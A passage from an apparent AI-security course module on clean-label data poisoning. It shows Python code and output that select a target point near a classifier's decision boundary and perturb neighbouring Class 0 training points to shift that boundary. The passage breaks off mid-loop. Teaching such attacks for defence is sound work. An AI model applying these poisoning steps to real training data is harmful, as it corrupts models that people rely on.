<math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>y</mi><mrow><mi>t</mi><mi>a</mi><mi>r</mi><mi>g</mi><mi>e</mi><mi>t</mi></mrow></msub><mo>=</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">y_{target} = 1</annotation></semantics></math>)
but also lies relatively close to the decision boundary separating
<code>Class 1</code> from <code>Class 0</code>, as determined by the
original baseline model. Points near the boundary are inherently more
vulnerable to misclassification if the boundary shifts, even slightly,
after retraining on the poisoned data.</p></p>
<p><p>To identify such a point, we can analyze the decision function scores
produced by the baseline model. Remember that the decision boundary
between <code>Class 0</code> and <code>Class 1</code> is where their
respective scores,
<math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><msub><mi>z</mi><mn>0</mn></msub><annotation encoding="application/x-tex">z_0</annotation></semantics></math>
and
<math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><msub><mi>z</mi><mn>1</mn></msub><annotation encoding="application/x-tex">z_1</annotation></semantics></math>,
are equal. We can define a function representing the difference between
these scores:</p></p>
<p><p><math display="block" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>f</mi><mn>01</mn></msub><mo stretchy="false" form="prefix">(</mo><mi>𝐱</mi><mo stretchy="false" form="postfix">)</mo><mo>=</mo><msub><mi>z</mi><mn>0</mn></msub><mo>−</mo><msub><mi>z</mi><mn>1</mn></msub><mo>=</mo><mo stretchy="false" form="prefix">(</mo><msub><mi>𝐰</mi><mn>0</mn></msub><mo>−</mo><msub><mi>𝐰</mi><mn>1</mn></msub><msup><mo stretchy="false" form="postfix">)</mo><mi>T</mi></msup><mi>𝐱</mi><mo>+</mo><mo stretchy="false" form="prefix">(</mo><msub><mi>b</mi><mn>0</mn></msub><mo>−</mo><msub><mi>b</mi><mn>1</mn></msub><mo stretchy="false" form="postfix">)</mo></mrow><annotation encoding="application/x-tex">f_{01}(\mathbf{x}) = z_0 - z_1 = (\mathbf{w}_0 - \mathbf{w}_1)^T \mathbf{x} + (b_0 - b_1)</annotation></semantics></math></p></p>
<p><p>The baseline model predicts <code>Class 1</code> for a point
<math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mi>𝐱</mi><annotation encoding="application/x-tex">\mathbf{x}</annotation></semantics></math>
if its score
<math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><msub><mi>z</mi><mn>1</mn></msub><annotation encoding="application/x-tex">z_1</annotation></semantics></math>
is greater than the scores for all other classes
<math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mi>k</mi><annotation encoding="application/x-tex">k</annotation></semantics></math>.
Specifically considering <code>Class 0</code> and <code>Class 1</code>,
the model favors <code>Class 1</code> if
<math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>z</mi><mn>1</mn></msub><mo>&gt;</mo><msub><mi>z</mi><mn>0</mn></msub></mrow><annotation encoding="application/x-tex">z_1 &gt; z_0</annotation></semantics></math>.
This condition is equivalent to the score difference
<math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>f</mi><mn>01</mn></msub><mo stretchy="false" form="prefix">(</mo><mi>𝐱</mi><mo stretchy="false" form="postfix">)</mo></mrow><annotation encoding="application/x-tex">f_{01}(\mathbf{x})</annotation></semantics></math>
being negative
(<math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>f</mi><mn>01</mn></msub><mo stretchy="false" form="prefix">(</mo><mi>𝐱</mi><mo stretchy="false" form="postfix">)</mo><mo>&lt;</mo><mn>0</mn></mrow><annotation encoding="application/x-tex">f_{01}(\mathbf{x}) &lt; 0</annotation></semantics></math>).</p></p>
<p><p>Therefore, we are looking for a specific point
<math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><msub><mi>𝐱</mi><mrow><mi>t</mi><mi>a</mi><mi>r</mi><mi>g</mi><mi>e</mi><mi>t</mi></mrow></msub><annotation encoding="application/x-tex">\mathbf{x}_{target}</annotation></semantics></math>
within the training set that meets our criteria:
<math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>y</mi><mrow><mi>t</mi><mi>a</mi><mi>r</mi><mi>g</mi><mi>e</mi><mi>t</mi></mrow></msub><mo>=</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">y_{target} = 1</annotation></semantics></math>,
and its score difference
<math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>f</mi><mn>01</mn></msub><mo stretchy="false" form="prefix">(</mo><msub><mi>𝐱</mi><mrow><mi>t</mi><mi>a</mi><mi>r</mi><mi>g</mi><mi>e</mi><mi>t</mi></mrow></msub><mo stretchy="false" form="postfix">)</mo></mrow><annotation encoding="application/x-tex">f_{01}(\mathbf{x}_{target})</annotation></semantics></math>
must be negative (confirming the baseline model classifies it correctly
relative to <code>Class 0</code>), while also being as close to zero as
possible. A score difference that is the largest negative value
indicates the point is correctly classified but is nearest to the
<math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>f</mi><mn>01</mn></msub><mo stretchy="false" form="prefix">(</mo><mi>𝐱</mi><mo stretchy="false" form="postfix">)</mo><mo>=</mo><mn>0</mn></mrow><annotation encoding="application/x-tex">f_{01}(\mathbf{x})=0</annotation></semantics></math>
boundary.</p></p>
<p><p>To find this optimal target point, we calculate
<math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>f</mi><mn>01</mn></msub><mo stretchy="false" form="prefix">(</mo><mi>𝐱</mi><mo stretchy="false" form="postfix">)</mo></mrow><annotation encoding="application/x-tex">f_{01}(\mathbf{x})</annotation></semantics></math>
for all training points
<math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><msub><mi>𝐱</mi><mi>i</mi></msub><annotation encoding="application/x-tex">\mathbf{x}_i</annotation></semantics></math>
whose true label
<math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><msub><mi>y</mi><mi>i</mi></msub><annotation encoding="application/x-tex">y_i</annotation></semantics></math>
is 1. We then select the specific point
<math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><msub><mi>𝐱</mi><mrow><mi>t</mi><mi>a</mi><mi>r</mi><mi>g</mi><mi>e</mi><mi>t</mi></mrow></msub><annotation encoding="application/x-tex">\mathbf{x}_{target}</annotation></semantics></math>
that yields the largest negative value (i.e., the value closest to zero)
for
<math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><msub><mi>f</mi><mn>01</mn></msub><annotation encoding="application/x-tex">f_{01}</annotation></semantics></math>.</p></p>


```python
print("\n--- Selecting Target Point ---")
# We use the baseline parameters w0_base, b0_base, w1_base, b1_base extracted earlier
# Calculate the difference vector and intercept for the 0-vs-1 boundary
w_diff_01_base = w0_base - w1_base
b_diff_01_base = b0_base - b1_base
print(f"Boundary vector (w0-w1): {w_diff_01_base}")
print(f"Intercept difference (b0-b1): {b_diff_01_base}")

# Identify indices of all Class 1 points in the original clean training set
class1_indices_train = np.where(y_train_3c == 1)[0]

if len(class1_indices_train) == 0:
    raise ValueError(
        "CRITICAL: No Class 1 points found in the training data. Cannot select target."
    )
else:
    print(f"Found {len(class1_indices_train)} Class 1 points in the training set.")

# Get the feature vectors for only the Class 1 points
X_class1_train = X_train_3c[class1_indices_train]

# Calculate the decision function f_01(x) = (w0-w1)^T x + (b0-b1) for these Class 1 points
# A negative value means the point is on the Class 1 side of the 0-vs-1 boundary
decision_values_01 = X_class1_train @ w_diff_01_base + b_diff_01_base

# Find indices within the subset of Class 1 points that are correctly classified (f_01 < 0)
class1_on_correct_side_indices_relative = np.where(decision_values_01 < 0)[0]

if len(class1_on_correct_side_indices_relative) == 0:
    # This case is unlikely if the baseline model has decent accuracy, but handle it.
    print(
        f"{malware_red}Warning:{white} No Class 1 points found on the expected side (f_01 < 0) of the 0-vs-1 baseline boundary."
    )
    print(
        "Selecting the Class 1 point with the minimum absolute decision value instead."
    )
    # Find index (relative to class1 subset) with the smallest absolute distance to boundary
    target_point_index_relative = np.argmin(np.abs(decision_values_01))
else:
    # Among the correctly classified points, find the one closest to the boundary
    # This corresponds to the maximum (least negative) decision value
    target_point_index_relative = class1_on_correct_side_indices_relative[
        np.argmax(decision_values_01[class1_on_correct_side_indices_relative])
    ]

# Map the relative index (within the class1 subset) back to the absolute index in the original X_train_3c array
target_point_index_absolute = class1_indices_train[target_point_index_relative]

# Retrieve the target point's features and true label
X_target = X_train_3c[target_point_index_absolute]
y_target = y_train_3c[
    target_point_index_absolute
]  # Should be 1 based on selection logic

# Sanity Check: Verify the chosen point's class and baseline prediction
target_baseline_pred = baseline_model_3c.predict(X_target.reshape(1, -1))[0]
target_decision_value = decision_values_01[target_point_index_relative]

print(f"\nSelected Target Point Index (absolute): {target_point_index_absolute}")
print(f"Target Point Features: {X_target}")
print(f"Target Point True Label (y_target): {y_target}")
print(f"Target Point Baseline Prediction: {target_baseline_pred}")
print(
    f"Target Point Baseline 0-vs-1 Decision Value (f_01): {target_decision_value:.4f}"
)

if y_target != 1:
    print(
        f"Error: Selected target point does not have label 1! Check logic."
    )
if target_baseline_pred != y_target:
    print(
        f"Warning: Baseline model actually misclassifies the chosen target point ({target_baseline_pred}). Attack might trivially succeed or have unexpected effects."
    )
if target_decision_value >= 0:
    print(
        f"Warning: Selected target point has f_01 >= 0 ({target_decision_value:.4f}), meaning it wasn't on the Class 1 side of the 0-vs-1 boundary. Check logic or baseline model."
    )

# Visualize the data highlighting the selected target point near the boundary
print("\n--- Visualizing Training Data with Target Point ---")
plot_data_multi(
    X_train_3c,
    y_train_3c,
    title="Training Data Highlighting the Target Point (Near Boundary)",
    highlight_indices=[target_point_index_absolute],
    highlight_markers=["P"],  # 'P' for Plus sign marker (Target)
    highlight_colors=[white],  # White edge color for visibility
    highlight_labels=[f"Target (Class {y_target}, Idx {target_point_index_absolute})"],
)
```

The above code identifies a good candidate for us to work with, index `373`:

```python
--- Selecting Target Point ---
Boundary vector (w0-w1): [-5.78792514  6.32142485]
Intercept difference (b0-b1): -0.9207223376477074
Found 350 Class 1 points in the training set.

Selected Target Point Index (absolute): 373
Target Point Features: [-0.55111155 -0.36675028]
Target Point True Label (y_target): 1
Target Point Baseline Prediction: 1
Target Point Baseline 0-vs-1 Decision Value (f_01): -0.0493

```

If we plot index `373` we can easily see where it is in the dataset.

![Scatter plot titled 'Training Data Highlighting the Target Point (Near Boundary)' showing Class 0 (blue), Class 1 (orange), Class 2 (red), and Target Point (white cross) across standardized Feature 1 and Feature 2.](/storage/modules/302/feature_attack_targted_point.png)

---

<!-- section 3572 | page 13 | group: Feature Attacks | type: interactive -->

# The Clean Label Attack

---
<p><p>Having identified the <code>target point</code>
<math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><msub><mi>𝐱</mi><mrow><mi>t</mi><mi>a</mi><mi>r</mi><mi>g</mi><mi>e</mi><mi>t</mi></mrow></msub><annotation encoding="application/x-tex">\mathbf{x}_{target}</annotation></semantics></math>,
our next step is to manipulate the training data specifically to cause
its misclassification. We achieve this by subtly shifting the learned
<code>decision boundary</code>. We will perturb the selected
<code>Class 0</code> (Blue) data points that are neighbours to the
<code>target point</code> in order to shift the boundary.</p></p>

<p><p>We first need to locate several <code>Class 0</code> points residing
closest to
<math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><msub><mi>𝐱</mi><mrow><mi>t</mi><mi>a</mi><mi>r</mi><mi>g</mi><mi>e</mi><mi>t</mi></mrow></msub><annotation encoding="application/x-tex">\mathbf{x}_{target}</annotation></semantics></math>
within the feature space. These neighbours serve as anchors influencing
the boundary’s local position. We then calculate small
<code>perturbations</code>, denoted
<math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><msub><mi>δ</mi><mi>i</mi></msub><annotation encoding="application/x-tex">\delta_i</annotation></semantics></math>,
for these selected neighbours
<math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><msub><mi>𝐱</mi><mi>i</mi></msub><annotation encoding="application/x-tex">\mathbf{x}_i</annotation></semantics></math>.
These perturbations are specifically designed to push each neighbour
slightly across the original decision boundary
(<math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>f</mi><mn>01</mn></msub><mo stretchy="false" form="prefix">(</mo><mi>𝐱</mi><mo stretchy="false" form="postfix">)</mo><mo>=</mo><mn>0</mn></mrow><annotation encoding="application/x-tex">f_{01}(\mathbf{x})=0</annotation></semantics></math>)
and into the region typically associated with <code>Class 1</code>
(Yellow). This process yields perturbed points
<math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><msup><mi>𝐱</mi><mo>′</mo></msup><mi>i</mi></msub><mo>=</mo><msub><mi>𝐱</mi><mi>i</mi></msub><mo>+</mo><msub><mi>δ</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">\mathbf{x}&#39;_i = \mathbf{x}_i + \delta_i</annotation></semantics></math>.</p></p>

<p><p>The poisoned training dataset is then created by substituting these
original neighbours
<math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><msub><mi>𝐱</mi><mi>i</mi></msub><annotation encoding="application/x-tex">\mathbf{x}_i</annotation></semantics></math>
with their perturbed counterparts
<math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><msub><msup><mi>𝐱</mi><mo>′</mo></msup><mi>i</mi></msub><annotation encoding="application/x-tex">\mathbf{x}&#39;_i</annotation></semantics></math>.
Crucially, we assign the original <code>Class 0</code> label to these
perturbed points
<math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><msub><msup><mi>𝐱</mi><mo>′</mo></msup><mi>i</mi></msub><annotation encoding="application/x-tex">\mathbf{x}&#39;_i</annotation></semantics></math>,
even though they now sit in the <code>Class 1</code> region according to
the baseline model.</p></p>

<p><p>When the model retrains on this poisoned data, it encounters a
conflict: points
(<math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><msub><msup><mi>𝐱</mi><mo>′</mo></msup><mi>i</mi></msub><annotation encoding="application/x-tex">\mathbf{x}&#39;_i</annotation></semantics></math>)
labeled <code>0</code> are located where it would expect points labeled
<code>1</code>. To reconcile this based on the provided (and unchanged)
labels, the model is forced to adjust its decision boundary. Typically,
it pushes the boundary
<math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>f</mi><mn>01</mn></msub><mo stretchy="false" form="prefix">(</mo><mi>𝐱</mi><mo stretchy="false" form="postfix">)</mo><mo>=</mo><mn>0</mn></mrow><annotation encoding="application/x-tex">f_{01}(\mathbf{x})=0</annotation></semantics></math>
outwards into the original <code>Class 1</code> region to correctly
classify the perturbed points
<math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><msub><msup><mi>𝐱</mi><mo>′</mo></msup><mi>i</mi></msub><annotation encoding="application/x-tex">\mathbf{x}&#39;_i</annotation></semantics></math>
as <code>Class 0</code>. A successful attack occurs when this induced
boundary shift is significant enough to engulf the nearby
<code>target point</code>
<math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><msub><mi>𝐱</mi><mrow><mi>t</mi><mi>a</mi><mi>r</mi><mi>g</mi><mi>e</mi><mi>t</mi></mrow></msub><annotation encoding="application/x-tex">\mathbf{x}_{target}</annotation></semantics></math>,
causing it to fall on the <code>Class 0</code> side of the new
boundary.</p></p>

<p><p>Throughout this process, the <code>perturbations</code>
<math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><msub><mi>δ</mi><mi>i</mi></msub><annotation encoding="application/x-tex">\delta_i</annotation></semantics></math>
must remain small. This subtlety ensures the <code>Class 0</code> label
still appears plausible for the altered feature vectors
<math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><msub><msup><mi>𝐱</mi><mo>′</mo></msup><mi>i</mi></msub><annotation encoding="application/x-tex">\mathbf{x}&#39;_i</annotation></semantics></math>,
thus preserving the "clean label" characteristic of the attack where
only features are modified, not labels.</p></p>



## Attack Implementation
<p><p>We begin the implementation by finding the required
<code>Class 0</code> neighbours closest to the
<code>target point</code>. We use Scikit-learn’s
<code>NearestNeighbors</code> algorithm, fitting it only on the
<code>Class 0</code> training data and then querying it with the
coordinates of
<math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><msub><mi>𝐱</mi><mrow><mi>t</mi><mi>a</mi><mi>r</mi><mi>g</mi><mi>e</mi><mi>t</mi></mrow></msub><annotation encoding="application/x-tex">\mathbf{x}_{target}</annotation></semantics></math>.
We must specify how many neighbours
(<code>n_neighbors_to_perturb</code>) to select for modification.</p></p>



```python
print("\n--- Identifying Class 0 Neighbors to Perturb ---")
n_neighbors_to_perturb = 5 # Hyperparameter: How many neighbors to modify

# Find indices of all Class 0 points in the original training set
class0_indices_train = np.where(y_train_3c == 0)[0]

if len(class0_indices_train) == 0:
    raise ValueError("CRITICAL: No Class 0 points found. Cannot find neighbors to perturb.")
else:
    print(f"Found {len(class0_indices_train)} Class 0 points in the training set.")

# Get features of only Class 0 points
X_class0_train = X_train_3c[class0_indices_train]

# Sanity check to ensure we don't request more neighbors than available
if n_neighbors_to_perturb > len(X_class0_train):
    print(f"Warning: Requested {n_neighbors_to_perturb} neighbors, but only {len(X_class0_train)} Class 0 points available. Using all available.")
    n_neighbors_to_perturb = len(X_class0_train)

if n_neighbors_to_perturb == 0:
    raise ValueError("No Class 0 neighbors can be selected to perturb (n_neighbors_to_perturb=0). Cannot proceed.")

# Initialize and fit NearestNeighbors on the Class 0 data points
# We use the default Euclidean distance ('minkowski' with p=2)
nn_finder = NearestNeighbors(n_neighbors=n_neighbors_to_perturb, algorithm='auto')
nn_finder.fit(X_class0_train)

# Find the indices (relative to X_class0_train) and distances of the k nearest Class 0 neighbors to X_target
distances, indices_relative = nn_finder.kneighbors(X_target.reshape(1, -1))

# Map the relative indices found within X_class0_train back to the original indices in X_train_3c
neighbor_indices_absolute = class0_indices_train[indices_relative.flatten()]
# Get the original feature vectors of these neighbors (needed for perturbation)
X_neighbors = X_train_3c[neighbor_indices_absolute]

# Output the findings for verification
print(f"\nTarget Point Index: {target_point_index_absolute} (True Class {y_target})")
print(f"Identified {len(neighbor_indices_absolute)} closest Class 0 neighbors to perturb:")
print(f"  Indices in X_train_3c: {neighbor_indices_absolute}")
print(f"  Distances to target: {distances.flatten()}")

# Sanity check: Ensure the target itself wasn't accidentally included (e.g., if it was mislabeled or data is unusual)
if target_point_index_absolute in neighbor_indices_absolute:
     print(f"Error: The target point itself was selected as one of its own Class 0 neighbors. This indicates a potential issue in data or logic.")
```

This has identified the 5 closest Class 0 points to our target:

```python
--- Identifying Class 0 Neighbors to Perturb ---
Found 350 Class 0 points in the training set.

Target Point Index: 373 (True Class 1)
Identified 5 closest Class 0 neighbors to perturb:
  Indices in X_train_3c: [ 761   82 1035  919  491]
  Distances to target: [0.10318016 0.12277741 0.14917583 0.25081115 0.30161621]
```
<p><p>Having identified the neighbours, we now determine the exact change
(<code>perturbation</code>) to apply to each one. The goal is to push
these points
(<math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><msub><mi>𝐱</mi><mi>i</mi></msub><annotation encoding="application/x-tex">\mathbf{x}_i</annotation></semantics></math>)
from their original <code>Class 0</code> region (where
<math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>f</mi><mn>01</mn></msub><mo stretchy="false" form="prefix">(</mo><msub><mi>𝐱</mi><mi>i</mi></msub><mo stretchy="false" form="postfix">)</mo><mo>&gt;</mo><mn>0</mn></mrow><annotation encoding="application/x-tex">f_{01}(\mathbf{x}_i) &gt; 0</annotation></semantics></math>)
just across the boundary into the <code>Class 1</code> region (where
<math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>f</mi><mn>01</mn></msub><mo>&lt;</mo><mn>0</mn></mrow><annotation encoding="application/x-tex">f_{01} &lt; 0</annotation></semantics></math>).</p></p>

<p><p>The most direct path across the boundary
<math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>f</mi><mn>01</mn></msub><mo stretchy="false" form="prefix">(</mo><mi>𝐱</mi><mo stretchy="false" form="postfix">)</mo><mo>=</mo><mo stretchy="false" form="prefix">(</mo><msub><mi>𝐰</mi><mn>0</mn></msub><mo>−</mo><msub><mi>𝐰</mi><mn>1</mn></msub><msup><mo stretchy="false" form="postfix">)</mo><mi>T</mi></msup><mi>𝐱</mi><mo>+</mo><mo stretchy="false" form="prefix">(</mo><msub><mi>b</mi><mn>0</mn></msub><mo>−</mo><msub><mi>b</mi><mn>1</mn></msub><mo stretchy="false" form="postfix">)</mo><mo>=</mo><mn>0</mn></mrow><annotation encoding="application/x-tex">f_{01}(\mathbf{x}) = (\mathbf{w}_0 - \mathbf{w}_1)^T \mathbf{x} + (b_0 - b_1) = 0</annotation></semantics></math>
is perpendicular to it. The vector
<math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>𝐯</mi><mn>01</mn></msub><mo>=</mo><mo stretchy="false" form="prefix">(</mo><msub><mi>𝐰</mi><mn>0</mn></msub><mo>−</mo><msub><mi>𝐰</mi><mn>1</mn></msub><mo stretchy="false" form="postfix">)</mo></mrow><annotation encoding="application/x-tex">\mathbf{v}_{01} = (\mathbf{w}_0 - \mathbf{w}_1)</annotation></semantics></math>,
which defines the boundary, is the <code>normal vector</code> and points
perpendicular to the boundary hyperplane. To move a point from the
<code>Class 0</code> side to the <code>Class 1</code> side, we need to
push it in the direction <code>opposite</code> to this normal vector,
namely
<math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>−</mi><msub><mi>𝐯</mi><mn>01</mn></msub></mrow><annotation encoding="application/x-tex">-\mathbf{v}_{01}</annotation></semantics></math>.</p></p>



We first normalize this direction vector to obtain a unit vector indicating the push direction:
<p><p><math display="block" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>𝐮</mi><mrow><mi>p</mi><mi>u</mi><mi>s</mi><mi>h</mi></mrow></msub><mo>=</mo><mfrac><mrow><mi>−</mi><msub><mi>𝐯</mi><mn>01</mn></msub></mrow><mrow><mo stretchy="false" form="postfix">∥</mo><msub><mi>𝐯</mi><mn>01</mn></msub><mo stretchy="false" form="postfix">∥</mo></mrow></mfrac><mo>=</mo><mfrac><mrow><mi>−</mi><mo stretchy="false" form="prefix">(</mo><msub><mi>𝐰</mi><mn>0</mn></msub><mo>−</mo><msub><mi>𝐰</mi><mn>1</mn></msub><mo stretchy="false" form="postfix">)</mo></mrow><mrow><mo stretchy="false" form="postfix">∥</mo><msub><mi>𝐰</mi><mn>0</mn></msub><mo>−</mo><msub><mi>𝐰</mi><mn>1</mn></msub><mo stretchy="false" form="postfix">∥</mo></mrow></mfrac></mrow><annotation encoding="application/x-tex">\mathbf{u}_{push} = \frac{-\mathbf{v}_{01}}{\|\mathbf{v}_{01}\|} = \frac{-(\mathbf{w}_0 - \mathbf{w}_1)}{\| \mathbf{w}_0 - \mathbf{w}_1 \|}</annotation></semantics></math></p></p>

<p><p>The distance we push the points is controlled by a small
hyperparameter,
<math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><msub><mi>ϵ</mi><mtext mathvariant="normal">cross</mtext></msub><annotation encoding="application/x-tex">\epsilon_{\text{cross}}</annotation></semantics></math>.
This value determines how far across the boundary the neighbours are
shifted. Smaller values yield subtler changes, while larger values
create a stronger push but might make the perturbed points less
plausible as <code>Class 0</code>.</p></p>

<p><p>The final perturbation vector
<math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><msub><mi>δ</mi><mi>i</mi></msub><annotation encoding="application/x-tex">\delta_i</annotation></semantics></math>
applied to each neighbour
<math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><msub><mi>𝐱</mi><mi>i</mi></msub><annotation encoding="application/x-tex">\mathbf{x}_i</annotation></semantics></math>
is the unit push direction scaled by the chosen magnitude:</p></p>

<p><p><math display="block" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>δ</mi><mi>i</mi></msub><mo>=</mo><msub><mi>ϵ</mi><mtext mathvariant="normal">cross</mtext></msub><mo>×</mo><msub><mi>𝐮</mi><mrow><mi>p</mi><mi>u</mi><mi>s</mi><mi>h</mi></mrow></msub></mrow><annotation encoding="application/x-tex">\delta_i = \epsilon_{\text{cross}} \times \mathbf{u}_{push}</annotation></semantics></math></p></p>

<p><p>Applying this results in the perturbed point
<math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><msup><mi>𝐱</mi><mo>′</mo></msup><mi>i</mi></msub><mo>=</mo><msub><mi>𝐱</mi><mi>i</mi></msub><mo>+</mo><msub><mi>δ</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">\mathbf{x}&#39;_i = \mathbf{x}_i + \delta_i</annotation></semantics></math>.
We expect the original neighbour
<math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><msub><mi>𝐱</mi><mi>i</mi></msub><annotation encoding="application/x-tex">\mathbf{x}_i</annotation></semantics></math>
to satisfy
<math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>f</mi><mn>01</mn></msub><mo stretchy="false" form="prefix">(</mo><msub><mi>𝐱</mi><mi>i</mi></msub><mo stretchy="false" form="postfix">)</mo><mo>&gt;</mo><mn>0</mn></mrow><annotation encoding="application/x-tex">f_{01}(\mathbf{x}_i) &gt; 0</annotation></semantics></math>,
while the perturbed point
<math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><msub><msup><mi>𝐱</mi><mo>′</mo></msup><mi>i</mi></msub><annotation encoding="application/x-tex">\mathbf{x}&#39;_i</annotation></semantics></math>
should satisfy
<math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>f</mi><mn>01</mn></msub><mo stretchy="false" form="prefix">(</mo><msub><msup><mi>𝐱</mi><mo>′</mo></msup><mi>i</mi></msub><mo stretchy="false" form="postfix">)</mo><mo>&lt;</mo><mn>0</mn></mrow><annotation encoding="application/x-tex">f_{01}(\mathbf{x}&#39;_i) &lt; 0</annotation></semantics></math>.</p></p>



```python
print("\n--- Calculating Perturbation Vector ---")
# Use the boundary vector w_diff_01_base = w0_base - w1_base calculated earlier

# The direction to push Class 0 points into Class 1 region is opposite to the normal vector (w0-w1)
push_direction = -w_diff_01_base
norm_push_direction = np.linalg.norm(push_direction)

# Handle potential zero vector for the boundary normal
if norm_push_direction < 1e-9: # Use a small threshold for floating point comparison
    raise ValueError("Boundary vector norm (||w0-w1||) is close to zero. Cannot determine push direction reliably.")
else:
    # Normalize the direction vector to unit length
    unit_push_direction = push_direction / norm_push_direction
    print(f"Calculated unit push direction vector (normalized - (w0-w1)): {unit_push_direction}")

# Define perturbation magnitude (how far across the boundary to push)
epsilon_cross = 0.25
print(f"Perturbation magnitude (epsilon_cross): {epsilon_cross}")

# Calculate the final perturbation vector (direction * magnitude)
perturbation_vector = epsilon_cross * unit_push_direction
print(f"Final perturbation vector (delta): {perturbation_vector}")
```

With this, we have calculated the vector to apply:

```python
--- Calculating Perturbation Vector ---
Calculated unit push direction vector (normalized - (w0-w1)): [ 0.67529883 -0.73754423]
Perturbation magnitude (epsilon_cross): 0.25
Final perturbation vector (delta): [ 0.16882471 -0.18438606]
```
<p><p>We apply this single calculated <code>perturbation_vector</code> to
each of the selected <code>Class 0</code> neighbors to generate the
poisoned dataset. We begin by creating a <code>safe copy</code> of the
original training features and labels, named
<code>X_train_poisoned</code> and <code>y_train_poisoned</code>
respectively. Then, we iterate through the indices of the identified
neighbours (<code>neighbor_indices_absolute</code>). For each
<code>neighbor_idx</code>, we retrieve its original feature vector
<math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><msub><mi>𝐱</mi><mi>i</mi></msub><annotation encoding="application/x-tex">\mathbf{x}_i</annotation></semantics></math>,
calculate the perturbed vector
<math display="inline" xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><msup><mi>𝐱</mi><mo>′</mo></msup><mi>i</mi></msub><mo>=</mo><msub><mi>𝐱</mi><mi>i</mi></msub><mo>+</mo><mtext mathvariant="normal">perturbation_vector</mtext></mrow><annotation encoding="application/x-tex">\mathbf{x}&#39;_i = \mathbf{x}_i + \text{perturbation\_vector}</annotation></semantics></math>,
and update the corresponding entry in <code>X_train_poisoned</code>. The
label for this index in <code>y_train_poisoned</code> remains unchanged
as <code>0</code>, copied from the original <code>y_train_3c</code>.
This loop constructs the final poisoned dataset ready for
retraining.</p></p>



```python
print("\n--- Applying Perturbations to Create Poisoned Dataset ---")
# Create a safe copy of the original training data to modify
X_train_poisoned = X_train_3c.copy()
y_train_poisoned = (
    y_train_3c.copy()
)  # Labels are copied but not changed for perturbed points

perturbed_indices_list = []  # Keep track of which indices were actually modified

# Iterate through the identified neighbor indices and their original features
# neighbor_indices_absolute holds the indices in X_train_3c/y_train_3c
# X_neighbors holds the corresponding original feature vectors
for i, neighbor_idx in enumerate(neighbor_indices_absolute):
    X_neighbor_original = X_neighbors[i]  # Original feature vector of the i-th neighbor

    # Calculate the new position of the perturbed neighbor
    X_perturbed_neighbor = X_neighbor_original + perturbation_vector

    # Replace the original neighbor's features with the perturbed features in the copied dataset
    X_train_poisoned[neighbor_idx] = X_perturbed_neighbor
    # The label y_train_poisoned[neighbor_idx] remains 0 (Class 0)

    perturbed_indices_list.append(neighbor_idx)  # Record the index that was modified

    # Verify the effect of perturbation on the f_01 score
